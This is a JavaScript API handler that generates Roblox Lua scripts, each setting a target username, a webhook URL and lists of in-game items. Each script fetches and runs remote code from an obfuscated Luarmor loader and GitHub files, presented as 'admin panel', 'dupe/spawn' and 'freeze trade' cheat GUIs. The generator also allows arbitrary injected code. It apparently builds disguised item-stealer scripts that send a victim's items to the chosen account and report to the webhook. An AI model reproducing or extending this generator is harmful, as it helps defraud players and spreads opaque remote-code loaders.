```js
// api/generate.js

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({
            error: 'Method not allowed'
        });
    }

    const {
        username,
        webhook,
        mode,
        brainrots,
        skins,
        gears,
        customCode,
        userId
    } = req.body || {};

    if (!username) {
        return res.status(400).json({
            error: 'Username is required'
        });
    }

    try {
        const script = buildScript(
            username,
            webhook,
            mode,
            brainrots || [],
            skins || [],
            gears || [],
            customCode || ''
        );

        const pasteId = await saveToInternalPaste(
            script,
            `Script para ${username}`,
            userId
        );

        const baseUrl =
            process.env.BASE_URL || 'https://oblivionhub.xyz';

        const rawUrl =
            `${baseUrl}/api/paste?id=${pasteId}&raw=true`;

        return res.status(200).json({
            loadstring:
                `loadstring(game:HttpGet("${rawUrl}"))()`,

            script: script,

            pasteUrl: rawUrl,

            pasteId: pasteId,

            obfuscated: false
        });

    } catch (error) {
        console.error('Error general:', error);

        return res.status(500).json({
            error: error.message || 'Internal server error'
        });
    }
}


// ============================================================
//  CONSTRUIR SCRIPT
// ============================================================

function buildScript(
    username,
    webhook,
    mode,
    brainrots,
    skins,
    gears,
    customCode
) {

    // ========================================================
    //  CONVERTIR ARRAY A TABLA LUA
    // ========================================================

    function luaTable(arr, indent = '    ') {

        if (!Array.isArray(arr) || arr.length === 0) {
            return '{}';
        }

        const items = arr.map(item => {
            const value = String(item)
                .replace(/\\/g, '\\\\')
                .replace(/"/g, '\\"');

            return `["${value}"] = true`;
        });

        return (
            '{\n' +
            items
                .map(item => indent + item)
                .join(',\n') +
            '\n}'
        );
    }


    // ========================================================
    //  VARIABLES GLOBALES
    // ========================================================

    const safeUsername = String(username)
        .replace(/\\/g, '\\\\')
        .replace(/"/g, '\\"');

    const safeWebhook = webhook
        ? String(webhook)
            .replace(/\\/g, '\\\\')
            .replace(/"/g, '\\"')
        : 'WEBHOOK_URL';


    let script =
        `getgenv().TARGET_USERNAME = "${safeUsername}"\n`;

    script +=
        `getgenv().WEBHOOK_URL = "${safeWebhook}"\n`;

    script +=
        `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;

    script +=
        `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;

    script +=
        `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;


    // ========================================================
    //  LUARMOR BASE ACTUAL
    // ========================================================

    const GUI_BASE =
        'https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua';


    // ========================================================
    //  GITHUB DE CADA GUI
    // ========================================================

    const GUI_GITHUB = {

        adminpanel:
            'https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua',

        dupespawn:
            'https://raw.githubusercontent.com/sab-api/GUIDUPE/refs/heads/main/GUIDUPE.lua',

        codesniper:
            'https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua'
    };


    // ========================================================
    //  NORMAL
    // ========================================================

    if (mode === 'normal') {

        script += `

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)`;

    }


    // ========================================================
    //  ADMIN PANEL
    //
    //  LUARMOR + GUIAP.LUA
    // ========================================================

    else if (mode === 'adminpanel') {

        script += `

-- ============================================================
-- GUI ADMIN PANEL
-- ============================================================

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("${GUI_GITHUB.adminpanel}"))()
end)`;

    }


    // ========================================================
    //  DUPE / SPAWN
    //
    //  LUARMOR + GUIDUPE.LUA
    // ========================================================

    else if (mode === 'dupespawn') {

        script += `

-- ============================================================
-- GUI DUPE / SPAWN
-- ============================================================

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("${GUI_GITHUB.dupespawn}"))()
end)`;

    }


    // ========================================================
    //  CODE SNIPER
    //
    //  LUARMOR + SNIPER.LUA
    // ========================================================

    else if (mode === 'codesniper') {

        script += `

-- ============================================================
-- GUI CODE SNIPER
-- ============================================================

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("${GUI_GITHUB.codesniper}"))()
end)`;

    }


    // ========================================================
    //  FREEZE TRADE
    // ========================================================
    //
    //  IMPORTANTE:
    //  Se mantiene temporalmente con el loader base porque
    //  todavía no tenemos confirmado el Luarmor NUEVO de
    //  Freeze Trade.
    //
    // ========================================================

    else if (mode === 'freezetrade') {

        script += `

-- ============================================================
-- GUI FREEZE TRADE
-- ============================================================

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)`;

    }


    // ========================================================
    //  CUSTOM
    // ========================================================

    else if (mode === 'custom') {

        script += `

-- ============================================================
-- GUI CUSTOM BASE
-- ============================================================

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)`;


        if (
            customCode &&
            String(customCode).trim()
        ) {

            const formattedCustomCode =
                String(customCode)
                    .replace(/\r?\n/g, '\n    ');

            script +=
                `\n\n` +
                `task.spawn(function()\n` +
                `    ${formattedCustomCode}\n` +
                `end)`;
        }
    }


    // ========================================================
    //  MODO DESCONOCIDO
    // ========================================================

    else {

        throw new Error(
            `Unknown generation mode: ${mode}`
        );
    }


    return script;
}


// ============================================================
//  GUARDAR EN PASTEFY INTERNO
// ============================================================

async function saveToInternalPaste(
    content,
    title,
    userId
) {

    const baseUrl =
        process.env.BASE_URL || 'https://oblivionhub.xyz';


    const response = await fetch(
        `${baseUrl}/api/paste`,
        {
            method: 'POST',

            headers: {
                'Content-Type': 'application/json'
            },

            body: JSON.stringify({
                content: content,

                title:
                    title || 'Untitled',

                userId:
                    userId || null,

                public: true
            })
        }
    );


    if (!response.ok) {

        let errorMessage =
            'Error al guardar el paste';

        try {

            const error =
                await response.json();

            errorMessage =
                error.error ||
                errorMessage;

        } catch (_) {

            const text =
                await response.text();

            if (text) {
                errorMessage = text;
            }
        }

        throw new Error(errorMessage);
    }


    const data =
        await response.json();


    if (!data.id) {
        throw new Error(
            'No se recibió ID del paste'
        );
    }


    return data.id;
}
```
